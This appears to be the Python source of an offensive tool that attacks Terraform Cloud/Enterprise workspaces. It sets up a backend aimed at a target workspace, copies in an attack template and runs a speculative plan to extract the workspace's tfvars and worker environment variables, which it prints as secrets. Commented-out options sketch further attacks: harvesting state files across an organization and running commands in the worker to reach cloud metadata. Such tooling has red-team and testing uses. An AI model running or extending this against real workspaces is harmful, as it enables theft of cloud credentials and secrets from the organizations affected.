import argparse
import os
import subprocess
#from terrasnek.api import TFC
#import terrasnek.exceptions
import json
from string import Template
import tempfile
import shutil
import glob
import re

# It checks if the terraform binary is present in the system
def check_terraform_binary():
    try:
        output = subprocess.check_output("terraform --version".split())
        output = output.decode('ascii')
        print("[+] Found terraform client, %s" % output.split('\n')[0])
        return True
    except FileNotFoundError as f:
        return False

# It creates a temporal folder that will be used by the terraform client.
# It adds to the folder a backend.tf with the TFC/TFE backend properlly configured
def setup_temp_folder(hostname, organization, workspace):
    # Using: https://docs.python.org/3.4/library/string.html#template-strings
    s = Template(open(os.path.join(os.path.dirname(os.path.realpath(__file__)), "templates/backend.tf")).read())
    backend_str = s.substitute(hostname=hostname, organization=organization, workspace=workspace)
    # Temp folder used to execute the terraform commands
    tmp_folder = tempfile.mkdtemp()
    with open(os.path.join(tmp_folder, 'backend.tf'), "w") as backend:
        backend.write(backend_str)
    return tmp_folder

# It performs a speculative plan and gets all the environment variables configured in the workspace.
# .tfvars and env
#
# Note:
# It would be possible to do this without the terraform client, using the API, but it's a bit more complicate:
# More info about the workflow to start a speculative run with the TFC API
# https://www.terraform.io/docs/cloud/run/api.html#summary
# First we need to create a configuration version with the template
# https://www.terraform.io/docs/cloud/api/configuration-versions.html#create-a-configuration-version
# Then upload it: 
# https://www.terraform.io/docs/cloud/api/configuration-versions.html#upload-configuration-files
# We could use this example:
# https://github.com/dahlke/terrasnek/blob/master/test/config_versions_test.py#L76
# Then we create a run for that configuration version
# https://www.terraform.io/docs/cloud/api/run.html#sample-payload
# We would need a loop checking for the run status:
# https://www.terraform.io/docs/cloud/api/run.html#get-run-details
# Finally we can get the result of the run with the env vars
def get_all_envs(tmp_folder, hostname, organization, workspace):
    # Copying template for attack to temp folder
    src_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), "templates/get_all_envs.tf")
    dst_file = os.path.join(tmp_folder, "get_all_envs.tf")
    shutil.copy(src_file, dst_file)
    
    # Running a speculative plan
    results = run_speculative_plan(tmp_folder)
    
    # Parsing and printing out the results
    print("[+] Terraform Variables from terraform.tfvars:")
    for result in re.findall("null_tfvars\" {.*?\n    }", results, re.DOTALL):
        secret = re.search("          \+ (.*)\n        }", result, re.DOTALL).group(1)
        print("\t" + secret)

    print("[+] All environment variables used in the worker:")
    for result in re.findall("null_envvars\" {.*?\n    }", results, re.DOTALL):
        secret = re.search("          \+ (.*)\n        }", result, re.DOTALL).group(1)
        print("\t" + secret)

# Runs a specualtive plan in TFC/TFE and gets the output
# It handles these scenarios:
#  * No valid credentails to run the speculative plan
#  * Issues when using a relative folder
def run_speculative_plan(tmp_folder):
    command = "terraform init -no-color"
    print(f"[+] Executing: {command}")
    output = subprocess.run(command.split(), cwd=tmp_folder, stdout=subprocess.PIPE).stdout
    output = output.decode('ascii')
    # ToDo: Use a logging library for debug messages
    # if debug:
    #     print(f"[+] Output:" {output}")
    if "unauthorized" in output:
        print("[!] You are not authorized. Run `terraform login $HOSTNAME`.")
        exit(-1)
    if not "Terraform has been successfully initialized!" in output:
        print("[!] Error running `terraform init` this is unexpected")
        exit(-1)
    command = "terraform plan -no-color"
    print(f"[+] Executing: {command}")
    output = subprocess.run(command.split(), cwd=tmp_folder, stdout=subprocess.PIPE).stdout
    output = output.decode('ascii')
    # This happens when the workspace is configured to use a folder relative to the target repository
    # We need to create that folder and move the files there
    if "can't cd to /terraform/" in output:
        target_dir = re.search("can't cd to /terraform/(.*)", output).group(1)
        print(f"[+] Workspace is configured to use a folder relative to the target repository, creating and moving files to: {target_dir}")        
        # Creating folder 
        target_dir = os.path.join(tmp_folder, target_dir)
        os.mkdir(target_dir)

        # Moving all .tf files to that folder
        for file in glob.glob(tmp_folder + '/*.tf'):
            # We need to leave the backend.tf at the root
            if "backend.tf" in file:
                continue 
            shutil.move(file, target_dir)

        #move all *.tf to target_dir
        command = "terraform plan -no-color"
        print(f"[+] Executing: {command}")
        output = subprocess.run(command.split(), cwd=tmp_folder, stdout=subprocess.PIPE).stdout
        output = output.decode('ascii')

    return output

# def get_atlas_token():
#     # ToDo: implement. Open the default file `~/.terraform.d/credentials.tfrc.json` (support windows/nix?) and get the token for the hostname
#     return ""

# Check to see if we have permissions to do what we need
# def check_token_and_permissions(hostname, organization, workspace, token):
#     api = TFC(token, url=hostname, verify=False)
#     try:
#         org_info = api.orgs.show(organization)
#     except terrasnek.exceptions.TFCHTTPNotFound:
#         print(f"[!] Atlas token doesn't have access to the organization {organization}") 
#         return False
#     api.set_org(organization)
#     try:
#         workspace_info = api.workspaces.show(workspace)
#         # ToDo: check if the workspace is locked
#         print(f"[+] Permissions for the workspace {workspace}")
#         print(json.dumps(workspace_info['data']['attributes']['permissions'], indent=4))
#         if not workspace_info['data']['attributes']['permissions']['can-queue-run']:
#             print("[!] The token doesn't have permissions to queue a run!")
#             return False
#     except terrasnek.exceptions.TFCHTTPNotFound:
#         print(f"[!] Atlas token doesn't have access to the workspace {workspace}") 
#         return False
#     return True


def parse_args():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('--hostname', type=str, help="Terraform Cloud or Enterprise URL. eg: https//app.terraform.io", required=True)
    arg_parser.add_argument('--organization', type=str, help="Terraform organization", required=True)
    arg_parser.add_argument('--workspace', type=str, help="Terraform workspace", required=True)
    #arg_parser.add_argument('--token', type=str, help="ATLAS token, if not specified the one in the system (~/.terraform.d/credentials.tfrc.json) will be used. To get one run `terraform login $HOSTNAME`", required=True)
    # Show all of these under a attacks category
    # ToDo: check that we are at least using one of this
    arg_parser.add_argument('--get_envs', action='store_true', help="It gets the state file just doing a plan, useful when the ATLAS TOKEN doesn't have permissions to access the state file")
    #arg_parser.add_argument('--get_state_file', type=str, help="It gets the state file just doing a plan, useful when the ATLAS TOKEN doesn't have permissions to access the state file")
    #arg_parser.add_argument('--get_all_state_files_from_org', type=str, help="Gets the ATLAS TOKEN used during a speculative run (plan), and abuse the implicit permissions to get the state files of all workspaces in the organization")
    #arg_parser.add_argument('--exec_command', type=str, help="Runs a command in the container used to run the speculative plan, useful to access TFC infra and access Cloud metadata if misconfigured")    
    return arg_parser.parse_args()


def main():
    args = parse_args()
    if not check_terraform_binary():
        # ToDo: Ideally we would point out to the user the same version as the used in the workspace. Not sure how to get this.
        print("terraform binary not found in your system. You can download from here: https://www.terraform.io/downloads.html")
        exit(-1)
    # if not args.token:
    #     # ToDo: get token from default config path
    #     args.token = get_atlas_token()    

    # Create a temp folder to use it during the attack
    tmp_folder = setup_temp_folder(args.hostname, args.organization, args.workspace)
    print(f"[+] Created temporal folder {tmp_folder}")

    # if not check_token_and_permissions(args.hostname, args.organization, args.workspace):
    #     exit(-1)
    # # ToDo: Based on the attack selected call a different function
    if args.get_envs:
        get_all_envs(tmp_folder, args.hostname, args.organization, args.workspace)

    # Remove temporal folder
    shutil.rmtree(tmp_folder)

if __name__ == "__main__":
    main()